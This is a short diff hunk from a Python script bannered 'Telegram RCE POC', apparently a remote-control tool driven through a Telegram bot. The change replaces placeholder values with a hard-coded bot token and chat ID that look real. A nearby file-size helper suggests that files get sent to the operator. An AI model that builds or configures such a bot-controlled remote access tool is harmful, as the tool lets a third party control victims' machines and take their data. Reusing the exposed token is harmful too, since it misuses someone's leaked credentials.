@@ -17,8 +17,8 @@ print(Fore.GREEN + """
 Telegram RCE POC | Provided by @Linuxndroid
 """ + Fore.RESET)
 
-bot = telebot.TeleBot("Bot Token")
-your_id = "Chat ID"
+bot = telebot.TeleBot("7247740671:AAGuNti00Elz2pPSdj7MWOxPTr3wb2U9wd8")
+your_id = "5050605444"
 
 def rsize(num):
     for unit in ("", "K", "M", "G", "T"):
